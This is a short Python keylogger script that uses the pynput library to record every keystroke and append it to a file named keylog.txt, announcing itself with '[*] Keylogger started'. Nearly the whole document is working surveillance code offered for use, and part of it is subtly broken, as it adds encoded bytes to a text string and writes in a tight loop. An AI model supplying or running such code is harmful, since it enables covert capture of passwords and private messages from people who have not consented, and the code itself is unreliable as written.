import pynput.keyboard
import datetime

log = ""

def on_press(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key) + " "

def write_log():
    global log
    with open("keylog.txt", "a") as f:
        f.write(log)
    log = ""

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)

print("[*] Keylogger started. Press Ctrl+C to stop and save logs.")

try:
    keyboard_listener.start()
    while True:
        write_log()
except KeyboardInterrupt:
    print("\n[*] Keylogger stopped.")
    write_log()
except Exception as e:
    print(f"[*] Error: {str(e)}")
    write_log()
